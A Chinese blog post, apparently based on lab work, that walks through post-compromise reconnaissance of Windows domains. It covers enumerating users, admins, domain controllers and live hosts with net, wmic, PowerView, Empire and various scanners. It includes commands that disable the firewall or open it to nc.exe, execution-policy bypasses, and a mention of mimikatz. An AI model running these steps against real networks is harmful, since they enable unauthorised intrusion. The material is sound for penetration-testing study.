<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>内网渗透信息收集总结 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="内网渗透信息收集总结" />
<meta property="og:description" content="内网信息收集 信息收集 一、内网信息收集概述 1.1、我是谁？
——对当前机器角色的判断
WEB服务器？开发测试服务器？公共服务器？文件服务器？代理服务器？DNS服务器？等等？？
根据 主机名、文件、网络连接情况综合判断。
1.2、这是哪？
—— 对当前机器所处网络环境的拓扑结构进行分析与判断。
绘制大致内网拓扑图
1.3、我在哪
——- 对当前机器所处区域的判断。
DMZ区、办公区、核心区
二、收集本机信息 2.1手动信息收集
2.1.1查询网络配置信息 ipconfig/all 2.1.2查询操作系统及软件信息 systeminfo 可查询出补丁，可利用系统自身存在的漏洞进行后续的提权。 systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本” 查看系统体系结构
echo %PROCESSOR_ARCHITECTURE% 查看安装的软件版本及路径等
wmic product get name,version 利用powershell收集软件版本信息
powershell “GET-WmiObject -class Win32_Product | Select-Object -Property name,version” 2.1.3查询本机服务信息 wmic service list brief 2.1.4查询进程列表 tasklist 查看当前进程和进程用户
wmic process list brief 2.1.5查看启动程序（启动项）信息 wmic startup get command,caption 2.1.6查看计划任务 schtasks /query /fo LIST /v 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/0777e9d0c8346a040a152f7de84660db/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-03T15:05:59+08:00" />
<meta property="article:modified_time" content="2023-05-03T15:05:59+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">内网渗透信息收集总结</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>内网信息收集</h2> 
<h2>信息收集</h2> 
<h3 id="h2-1">一、内网信息收集概述</h3> 
<p>1.1、我是谁？</p> 
<p>——对当前机器角色的判断</p> 
<p>WEB服务器？开发测试服务器？公共服务器？文件服务器？代理服务器？DNS服务器？等等？？</p> 
<p>根据 主机名、文件、网络连接情况综合判断。</p> 
<p>1.2、这是哪？</p> 
<p>—— 对当前机器所处网络环境的拓扑结构进行分析与判断。</p> 
<p>绘制大致内网拓扑图</p> 
<p>1.3、我在哪</p> 
<p>——- 对当前机器所处区域的判断。</p> 
<p>DMZ区、办公区、核心区</p> 
<h3 id="h2-2">二、收集本机信息</h3> 
<p>2.1手动信息收集</p> 
<h4 id="h3-1">2.1.1查询网络配置信息</h4> 
<pre>ipconfig/all</pre> 
<h4 id="h3-2">2.1.2查询操作系统及软件信息</h4> 
<pre>systeminfo
可查询出补丁，可利用系统自身存在的漏洞进行后续的提权。
systeminfo | findstr /B /C:“OS 名称” /C:“OS 版本”</pre> 
<p>查看系统体系结构</p> 
<pre>echo %PROCESSOR_ARCHITECTURE%</pre> 
<p>查看安装的软件版本及路径等</p> 
<pre>wmic product get name,version</pre> 
<p>利用powershell收集软件版本信息</p> 
<pre>powershell “GET-WmiObject -class Win32_Product | Select-Object -Property name,version”</pre> 
<h4 id="h3-3">2.1.3查询本机服务信息</h4> 
<pre>wmic service list brief</pre> 
<h4 id="h3-4">2.1.4查询进程列表</h4> 
<pre>tasklist</pre> 
<p>查看当前进程和进程用户</p> 
<pre>wmic process list brief</pre> 
<h4 id="h3-5">2.1.5查看启动程序（启动项）信息</h4> 
<pre>wmic startup get command,caption</pre> 
<h4 id="h3-6">2.1.6查看计划任务</h4> 
<pre>schtasks /query /fo LIST /v</pre> 
<h4 id="h3-7">2.1.7查看用户列表</h4> 
<p>查看本机用户列表</p> 
<pre>net user</pre> 
<p>获取本地管理员组</p> 
<pre>net localgroup administrators</pre> 
<p>查看当前在线用户：</p> 
<pre>query user || qwinsta</pre> 
<h4 id="h3-8">2.1.8查看主机开机时间</h4> 
<pre>net statistics workstation</pre> 
<h4 id="h3-9">2.1.9列出或端开本地计算机与所有连接的客户端之间的会话</h4> 
<pre>net session</pre> 
<h4 id="h3-10">2.1.10 查询端口列表</h4> 
<pre>netstat -ano</pre> 
<h4 id="h3-11">2.1.11 查看补丁列表</h4> 
<pre>systeminfo
wmic qfe get Caption,Descript,HotFixID,InstalledOn</pre> 
<h4 id="h3-12">2.1.12查询本地共享列表</h4> 
<pre>net share
wmic share get name,path,status</pre> 
<h4 id="h3-13">2.1.13查询路由表及所有可用接口的ARP缓存表</h4> 
<pre>route print
arp -a</pre> 
<h4 id="h3-14">2.1.14查看防火墙相关配置</h4> 
<p>查杀软</p> 
<pre>WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</pre> 
<p>关闭防火墙</p> 
<pre>netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)
netsh advfirewall set allprofiles state off (Windows Server 2003 系统及之后版本)</pre> 
<p>查看防火墙配置</p> 
<pre>netstat firewall show config</pre> 
<p>修改防火墙配置</p> 
<pre>win server 2003 及之前，允许指定程序全部连接。

netsh firewall add allowedprogram c:\nc.exe “allwa nc” enable

win server 2003 之后
netsh advfirewall firewall add rule name=“pass nc” dir=in action=allow program=“c:\nc.exe”

允许指定程序退出
netsh advfirewall firewall add rule name=“Allow nc” dir=out action=allow program=“c:\nc.exe”

允许 3389 端口放行
netsh advfirewall firewall add rule name=“Remote Desktop” protocol=TCP dir=in localport=3389 action=allow

自定义翻过墙存储位置
netsh advfirewall set currentprofile logging filename “c:\windows\temp\fw.log”

远程桌面连接历史记录

cmdkey /l</pre> 
<p>自定义防火墙日志的储存位置</p> 
<pre>netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"</pre> 
<h4 id="h3-15">2.2自动收集信息</h4> 
<p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" rel="nofollow" title="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p> 
<p>下载后直接运行脚本： <code>wmic_info.bat</code></p> 
<h3 id="h2-3">三、查看当前权限</h3> 
<h4 id="h3-16">3.1权限</h4> 
<ul><li> <p>本地普通用户</p> </li><li> <p>本地管理员用户</p> </li><li> <p>本地域内用户</p> </li></ul> 
<h4 id="h3-17">3.2获取域SID</h4> 
<pre>whoami /all</pre> 
<h4 id="h3-18">3.3查询指定用户详细信息</h4> 
<pre>net user win7 /domain</pre> 
<h3 id="h2-4">四、判断是否存在域</h3> 
<p>了解本机信息后，接下来就要判断当前所在内网是否存在域。</p> 
<h4 id="h3-19">4.1 ipconfig</h4> 
<p>查看网关IP地址、DNS的ip地址、域名、本机是否和DNS服务器处于同一网段等信息。</p> 
<pre>ipconfig /all</pre> 
<p>然后<code>nslookup</code>解析域名的ip地址，查看是否与DNS服务器在同一ip上。</p> 
<pre>nslookup security.com</pre> 
<h4 id="h3-20">4.2 查看系统详细信息</h4> 
<pre>systeminfo</pre> 
<p>从中看到处于域 <code>security.com</code></p> 
<h4 id="h3-21">4.3 查看当前登录域及域用户</h4> 
<pre>net config workstation</pre> 
<h4 id="h3-22">4.4 判断主域</h4> 
<pre>net time /domain</pre> 
<h3 id="h2-5">五、搜集域内基本信息</h3> 
<h4 id="h3-23">5.1 查询域</h4> 
<pre>net view /domain</pre> 
<h4 id="h3-24">5.2 查询域内所有计算机</h4> 
<pre>net view /domain:SECURITY</pre> 
<h4 id="h3-25">5.3 查询域内所有用户组列表</h4> 
<pre>net group /domain</pre> 
<ul><li> <p>Domain Admins : 域管理员组</p> </li><li> <p>Domain Computers : 域内机器</p> </li><li> <p>Domain Controllers ：域控制器</p> </li><li> <p>Domain Guest ： 域访客，权限较低</p> </li><li> <p>Domain User ： 域用户</p> </li><li> <p>Enterprise Admins ： 企业系统管理员用户</p> </li></ul> 
<p>默认，Domain Admins 、Enterprise Admins 对域内机器有完全控制权。</p> 
<h4 id="h3-26">5.4 查询所有域成员计算机列表</h4> 
<pre>net group “domain computers” /doamin</pre> 
<h4 id="h3-27">5.5 获取域用户密码信息</h4> 
<pre>net accounts /domain</pre> 
<h4 id="h3-28">5.6 获取域信任信息</h4> 
<pre>nltest /domain_trusts</pre> 
<h3 id="h2-6">六、查看域控制器</h3> 
<h4 id="h3-29">6.1查看域控制器的机器名</h4> 
<pre>nltest /DCLIST:security</pre> 
<h4 id="h3-30">6.2查看域控制器的主机名</h4> 
<pre>nslookup -type=SRV_ldap_tcp</pre> 
<h4 id="h3-31">6.3查看当前时间</h4> 
<pre>net time /domain</pre> 
<h4 id="h3-32">6.4查看域控制器组</h4> 
<pre>net group “domain controllers” /domain</pre> 
<h3 id="h2-7">七、获取域内用户和管理员信息</h3> 
<h4 id="h3-33">7.1查询所有域用户列表</h4> 
<pre>net user /domain</pre> 
<h4 id="h3-34">7.2获取域内用户详细信息</h4> 
<pre>wmic useraccount get /all</pre> 
<h4 id="h3-35">7.3查看存在的用户</h4> 
<pre>dsquery user

dsquery computer - 查找目录中的计算机。
dsquery contact - 查找目录中的联系人。
dsquery subnet - 查找目录中的子网。
dsquery group - 查找目录中的组。
dsquery ou - 查找目录中的组织单位。
dsquery site - 查找目录中的站点。
dsquery server - 查找目录中的域控制器。
dsquery user - 查找目录中的用户。
dsquery quota - 查找目录中的配额。
dsquery partition - 查找目录中的分区。
dsquery * - 用通用的 LDAP 查询查找目录中的任何对象。
dsquery computer domainroot -limit 65535 &amp;&amp; net group “domain computers” /domain  //列出该域内所有机器名
dsquery user domainroot -limit 65535 &amp;&amp; net user /domain //列出该域内所有用户名
dsquery subnet //列出该域内网段划分
dsquery group &amp;&amp; net group /domain //列出该域内分组
dsquery ou //列出该域内组织单位
dsquery server &amp;&amp; net time /domain //列出该域内域控制器</pre> 
<h4 id="h3-36">7.4查询本地管理员组用户</h4> 
<pre>net localgroup administrators</pre> 
<h3 id="h2-8">八、查询域管理员用户组</h3> 
<h4 id="h3-37">8.1查询域管理员用户</h4> 
<pre>net group “domain admins” /domain</pre> 
<h4 id="h3-38">8.2查询管理员用户组</h4> 
<pre>net group “enterprise admins” /domain</pre> 
<h3 id="h2-9">九、定位域管理员</h3> 
<h4 id="h3-39">9.1域管理员定位概述</h4> 
<p>内网中通常会有大量网络安全系统和设备，IDS, IPS, 日志审计，安全网关，反病毒软件等。</p> 
<p>在一个域中，当计算机加入域之后，会默认给域管理员组赋予本地系统管理员权限。因此，域管理员组的成员均可访问本地计算机，且具有完全控制权限。</p> 
<p>定位域管理员渠道：</p> 
<ul><li> <p>日志：本地机器管理员日志，使用脚本或者Wevtuil工具导出查看。</p> </li><li> <p>会话，域内每台机器的登录会话，netsess.exe, powerview 等工具查询。</p> </li></ul> 
<h4 id="h3-40">9.2常用域管理员定位权限</h4> 
<h4 id="h3-41">9.2.1 psloggedon.exe</h4> 
<p><code>net session</code>可查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机</p> 
<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon" rel="nofollow" title="下载链接">下载链接</a></p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;PsLoggedon.exe \\DC

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.

Users logged on via resource shares:
2023/2/28 16:06:09         WEB\Administrator
2023/2/28 16:06:25         DE1AY\de1ay</pre> 
<h4 id="h3-42">9.2.2 PVEFindADUser.exe</h4> 
<p>用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过RDP登录用户、用于运行服务器和计划任务的用户。需管理员权限</p> 
<p>下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn" title="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p> 
<p>使用:</p> 
<pre>C:\Users\mssql\Desktop&gt;PVEFindADUser.exe -current
-----------------------------------------
PVE Find AD Users
Peter Van Eeckhoutte
(c) 2009 - http://www.corelan.be:8800
Version : 1.0.0.12
-----------------------------------------
[+] Finding currently logged on users ? true
[+] Finding last logged on users ? false

[+] Enumerating all computers...
[+] Number of computers found : 3
[+] Launching queries
[+] Processing host : DC.de1ay.com (Windows Server 2012 R2 Standard)
[+] Processing host : PC.de1ay.com (Windows 7 旗舰版;Service Pack 1)
[+] Processing host : WEB.de1ay.com (Windows Server 2008 R2 Standard;Servic
e Pack 1)
[-] Computer : WEB.de1ay.com Down
[+] Report written to report.csv</pre> 
<h4 id="h3-43">9.2.3 netview.exe</h4> 
<p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p> 
<p><a href="https://github.com/mubix/netview" title="下载链接">下载链接</a></p> 
<p>使用：netview.exe -d DE1AY(域名)</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;netview.exe -d DE1AY
[+] Domain Specified: DE1AY

[*] Using interval: 0
[*] Using jitter: 0.00

[+] Number of hosts: 2

[+] Host: DC
Enumerating AD Info[+] DC - Comment -
[+] D - OS Version - 6.3
[+] DC - Domain Controller

Enumerating IP Info
[+] (null) - IPv4 Address - 10.10.10.10

Enumerating Share Info
[+] DC - Share : ADMIN$               : ????
[+] DC - Share : C$                   : ????
[+] DC - Share : IPC$                 : ?? IPC
[+] DC - Share : NETLOGON             : Logon server share
[+] DC - Share : SYSVOL               : Logon server share

Enumerating Session Info
[+] DC - Session - Administrator from \\10.10.10.80 - Active: 26035 - Idle: 6898

[+] DC - Session - de1ay from \\10.10.10.80 - Active: 0 - Idle: 0

Enumerating Logged-on Users
[+] DC - Logged-on - DE1AY.COM\de1ay

[+] Host: PC
Enumerating AD Info[+] PC - Comment -
[+] P - OS Version - 6.1

Enumerating IP Info
[+] (null) - IPv4 Address - 10.10.10.201

Enumerating Share Info
[+] PC - Share : ADMIN$               : ????
[+] PC - Share : C$                   : ????
[+] PC - Share : IPC$                 : ?? IPC

Enumerating Session Info
[+] PC - Session - de1ay from \\10.10.10.80 - Active: 0 - Idle: 0

Enumerating Logged-on Users</pre> 
<h4 id="h3-44">9.2.4 Nmap的NSE脚本</h4> 
<p>zenmap</p> 
<p><a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html" rel="nofollow" title="下载链接">下载链接</a></p> 
<p>使用:</p> 
<pre>nmap --script=smb-os-discovery.nse -p 445 192.168.7.107</pre> 
<h4 id="h3-45">9.2.5 powerview脚本</h4> 
<p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView" title="下载链接">下载链接</a></p> 
<p>使用：</p> 
<pre>powershell.exe -exec bypass -Command "&amp; {Import-Module .\PowerView.ps1;Invoke-UserHunter}"</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop\PowerSploit-3.0.0\Recon&gt;powershell.exe -exec bypass
-Command "&amp; {Import-Module .\PowerView.ps1;Invoke-UserHunter}"

UserDomain   : de1ay.com
UserName     : Administrator
ComputerName : DC.de1ay.com
IP           : 10.10.10.10
SessionFrom  : 10.10.10.80
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : WEB
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :

UserDomain   : DE1AY
UserName     : Administrator
ComputerName : WEB.de1ay.com
IP           : {10.10.10.80, 192.168.5.131}
SessionFrom  :
LocalAdmin   :</pre> 
<h4 id="h3-46">9.2.6 Empire 的 user_hunter 模块</h4> 
<h3 id="h2-10">十、查找与管理进程</h3> 
<p>典型域提权： 明文凭据或通过 mimikatz （kali 自带工具，密码抓取神器）提权。</p> 
<h4 id="h3-47">10.1本机检查</h4> 
<p>获取域管理员列表</p> 
<pre>net group “domain admins” /domain</pre> 
<p>列出本机所有进程及进程用户</p> 
<pre>tasklist /v</pre> 
<p>寻找域控制器的域用户会话</p> 
<p>原理：在域控制器中查询域会话列表，并将其与域管理员列表交叉引用，从而得到与管理会话的系统列表。</p> 
<p><code>NetSess -h</code>(netsess.exe须上载到目标机器中)</p> 
<h3 id="h2-11">十一、探测域内存活主机</h3> 
<h4 id="h3-48">11.1 利用NetBIOS 快速探测内网<a href="https://github.com/search?q=nbtscan" title="nbtscan下载链接">nbtscan下载链接</a></h4> 
<p>命令：</p> 
<pre>nbtscan.exe -h

nbtscan.exe 10.1.1.1/24</pre> 
<h4 id="h3-49">11.2 利用ICMP协议快速探测内网</h4> 
<pre>for /L %i in (1,1,254) DO @ping -w 1 -n 1 10.1.1.%i | findstr “TTL=”</pre> 
<h4 id="h3-50">11.3 通过 Arp协议探测</h4> 
<pre>arp.exe -t 10.1.1.1/24

Empire、Nishang

arp -a</pre> 
<h4 id="h3-51">11.5.1 telnet</h4> 
<pre>telnet DC 22</pre> 
<h4 id="h3-52">11.5.2 MSF</h4> 
<pre>search scanner/portscan/tcp
use 0
show options
set port 1-1000
set rhosts 192.168.1.1
set threads 10
run</pre> 
<h2>域内主机存活检测</h2> 
<h3 id="h2-12">一、ping</h3> 
<p>如果服务器禁ping，该方法不可用</p> 
<h4 id="h3-53">windows</h4> 
<pre>for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i "ttl="</pre> 
<pre>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i "ttl="
来自 192.168.7.7 的回复: 字节=32 时间&lt;1ms TTL=128
来自 192.168.7.107 的回复: 字节=32 时间=1ms TTL=64
来自 192.168.7.110 的回复: 字节=32 时间&lt;1ms TTL=128</pre> 
<h4 id="h3-54">linux</h4> 
<pre>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep "ttl"|awk -F "[ :]+" '{print $4}'; done</pre> 
<p>VPS脚本</p> 
<pre>strSubNet = "192.168.7."  
Set objFSO= CreateObject("Scripting.FileSystemObject")  
Set objTS = objfso.CreateTextFile("C:\Result.txt")   
For i = 1 To 254  
strComputer = strSubNet &amp; i  
blnResult = Ping(strComputer)  
If blnResult = True Then  
objTS.WriteLine strComputer &amp; " is alived ! :) "  
End If  
Next   
objTS.Close  
WScript.Echo "All Ping Scan , All Done ! :) "    
Function Ping(strComputer)  
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") 
Set colItems = objWMIService.ExecQuery("Select * From Win32_PingStatus Where Address='" &amp; strComputer &amp; "'") 
For Each objItem In colItems  
Select case objItem.StatusCode  
Case 0  
Ping = True  
Case Else  
Ping = False  
End select  
Exit For  
Next  
End Function</pre> 
<pre>strSubNet = “10.10.10.”

Set objFSO= CreateObject(“Scripting.FileSystemObject”)

Set objTS = objfso.CreateTextFile(“C:\Windows\Temp\Result.txt”)

For i = 1 To 254

strComputer = strSubNet &amp; i

blnResult = Ping(strComputer)

If blnResult = True Then

objTS.WriteLine strComputer &amp; " is alived !  "

End If

Next

objTS.Close

WScript.Echo "All Ping Scan , All Done !  "

Function Ping(strComputer)

Set objWMIService = GetObject(“winmgmts:\.\root\cimv2”)

Set colItems = objWMIService.ExecQuery(“Select * From Win32_PingStatus Where Address=’” &amp; strComputer &amp; “’”)

For Each objItem In colItems

Select case objItem.StatusCode

Case 0

Ping = True

Case Else

Ping = False

End select

Exit For

Next

End Function</pre> 
<h3 id="h2-13">二、PowerShell</h3> 
<h4 id="h3-55">TSPingSweep</h4> 
<p>下载地址：</p> 
<p><a href="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1" rel="nofollow" title="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1">https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1</a></p> 
<p>使用：</p> 
<pre>powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"</pre> 
<p>msf</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"
powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 10.10.10.1 -EndAddress 10.10.10.254 -ResolveHost -ScanPort -Port 445,135"

IPAddress                  HostName                   Ports                    
---------                  --------                   -----                    
10.10.10.10                dc.de1ay.com               {445, 135}               
10.10.10.80                WEB.de1ay.com              {445, 135}               
10.10.10.201               PC.de1ay.com               {445, 135}</pre> 
<p>powershell</p> 
<pre></pre> 
<h4 id="h3-56">ARPScan</h4> 
<p>下载地址：</p> 
<p><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1" rel="nofollow" title="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p> 
<p>使用：</p> 
<pre>powershell.exe -exec bypass -Command "Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24"</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;powershell.exe -exec bypass -Command "Import-Module
./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 10.10.10.0/24"

MAC                                     Address
---                                     -------
00:0C:29:4E:20:BD                       10.10.10.10
00:0C:29:68:D3:69                       10.10.10.80
00:0C:29:9E:7B:7A                       10.10.10.201
00:50:56:E5:AA:97                       10.10.10.254
00:0C:29:68:D3:69                       10.10.10.255</pre> 
<h3 id="h2-14">三、arp-scan</h3> 
<p>使用ARP协议进行探测</p> 
<p>下载地址：</p> 
<p><a href="https://github.com/QbsuranAlang/arp-scan-windows-" title="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p> 
<p>使用：</p> 
<pre>arp-scan.exe -t 10.10.10.0/24</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;arp-scan.exe -t 10.10.10.0/24
Reply that 00:0C:29:4E:20:BD is 10.10.10.10 in 15.243100
Reply that 00:0C:29:68:D3:69 is 10.10.10.80 in 0.028800
Reply that 00:0C:29:9E:7B:7A is 10.10.10.201 in 14.66600
Reply that 00:50:56:E5:AA:97 is 10.10.10.254 in 14.76810
Reply that 00:0C:29:68:D3:69 is 10.10.10.255 in 0.024700</pre> 
<h3 id="h2-15">四、arp-ping</h3> 
<p>Arp-ping 基于 arp 协议，它可以ping受防火墙保护的主机</p> 
<p>下载地址：</p> 
<p><a href="https://www.elifulkerson.com/projects/arp-ping.php" rel="nofollow" title="arp-ping.exe">arp-ping.exe</a></p> 
<p>使用：</p> 
<p>因为arp-ping一次只能ping一个主机，实战中肯定是不行的，所以需要写个循环</p> 
<pre>for /l %i in (1,1,255) do @arp-ping.exe 10.10.10.%i -w 1 -n 1|find /i "Reply"</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;for /l %i in (1,1,255) do @arp-ping.exe 10.10.10.%i
-w 1 -n 1|find /i "Reply"
Reply that 00:0C:29:4E:20:BD is 10.10.10.10 in 15.832ms
Reply that 00:0C:29:68:D3:69 is 10.10.10.80 in 0.046ms
Reply that 00:0C:29:9E:7B:7A is 10.10.10.201 in 6.804ms
Reply that 00:50:56:E5:AA:97 is 10.10.10.254 in 3.404ms
Reply that 00:0C:29:68:D3:69 is 10.10.10.255 in 0.047ms</pre> 
<h3 id="h2-16">五、Empire</h3> 
<p><code>Empire</code>内置了<code>arpscan</code>模块，该模块可利用arp协议对内网主机进行探测。将目标主机上线 <code>Empire</code>后，使用<code>powershell/situational_awareness/network/arpscan</code>模块，设置扫描范围即可，具体如下：</p> 
<pre>(Empire: listeners) &gt; agents
[*] Active agents:
Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen
----     -- -----------     ------------      --------                -------            ---    -----    ---------
APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5/0.0    2021-02-23 20:43:27
(Empire: agents) &gt; usemodule powershell/situational_awareness/network/arpscan
(Empire: powershell/situational_awareness/network/arpscan) &gt; set Agent APDGSW9X
(Empire: powershell/situational_awareness/network/arpscan) &gt; set CIDR 192.168.7.0/24
(Empire: powershell/situational_awareness/network/arpscan) &gt; execute
MAC               Address      
---               -------      
16:7D:DA:D7:8F:64 192.168.7.1  
00:0C:29:1D:82:CF 192.168.7.7  
00:0C:29:A9:62:98 192.168.7.107
00:0C:29:DC:01:0D 192.168.7.110
00:0C:29:1D:82:CF 192.168.7.255</pre> 
<h3 id="h2-17">六、btscan</h3> 
<p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p> 
<p>下载地址： <a href="http://www.unixwiz.net/tools/nbtscan.html" rel="nofollow" title="nbtscan - NETBIOS nameserver scanner">nbtscan - NETBIOS nameserver scanner</a></p> 
<p>会被杀软杀掉</p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;nbtscan-1.0.35.exe 10.10.10.0/24
10.10.10.10     DE1AY\DC                        SHARING DC
10.10.10.80     DE1AY\WEB                       SHARING
10.10.10.201    DE1AY\PC                        SHARING
*timeout (normal end of scan)</pre> 
<h3 id="h2-18">七、scanline</h3> 
<p>McAfee 出品，推荐 win 下使用（管理员执行）</p> 
<p>下载地址：</p> 
<p><a href="https://pan.wgpsec.org/d/public_open/4-%E5%90%8E%E6%B8%97%E9%80%8F%20%26%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/ScanLine.exe?sign=dpTNwfDvP3g1Zx2Y2Vjj9NctuZxXXP6QYJ8uhnSpw4s=:0" rel="nofollow" title="https://pan.wgpsec.org/d/public_open/4-后渗透 %26 域渗透/信息收集/端口探测/ScanLine.exe?sign=dpTNwfDvP3g1Zx2Y2Vjj9NctuZxXXP6QYJ8uhnSpw4s=:0">https://pan.wgpsec.org/d/public_open/4-后渗透 %26 域渗透/信息收集/端口探测/ScanLine.exe?sign=dpTNwfDvP3g1Zx2Y2Vjj9NctuZxXXP6QYJ8uhnSpw4s=:0</a></p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;ScanLine.exe -h -t 22,80,445,3389,1099,1433,3306,33
89 -u 53,161,137,139 -O log.txt -p 10.10.10.1-254 /b
ScanLine (TM) 1.01
Copyright (c) Foundstone, Inc. 2002
http://www.foundstone.com

Scan of 254 IPs started at Tue Feb 28 15:49:46 2023

-------------------------------------------------------------------------------
10.10.10.10
Responds with ICMP unreachable: No
TCP ports: 445 3389
UDP ports: 53

-------------------------------------------------------------------------------
10.10.10.80
Responds with ICMP unreachable: Yes
TCP ports: 80 445 1433 3389
UDP ports: 137

TCP 80:
[HTTP/1.1 200 OK Server: Microsoft-IIS/7.5 X-Powered-By: ASP.NET Date: Tue, 28 F
eb 2023 07:50:07 GMT Connection: close Content-Length: 0]

-------------------------------------------------------------------------------
10.10.10.201
Responds with ICMP unreachable: No
TCP ports: 445 3389
UDP ports:

-------------------------------------------------------------------------------

Scan finished at Tue Feb 28 15:53:19 2023

254 IPs and 3048 ports scanned in 0 hours 3 mins 32.69 secs</pre> 
<p>挺慢的</p> 
<h3 id="h2-19">八、telnet</h3> 
<p>通过<code>telnet</code>探测 445 端口或者其他端口判断主机存活。</p> 
<pre>for /l %a in (1,1,254) do start /min /low telnet 10.10.10.%a 445</pre> 
<h3 id="h2-20">九、tcping</h3> 
<p>tcping.exe 是一个命令行程序，其操作类似于ping，但它通过 TCP 工作</p> 
<p>下载地址：</p> 
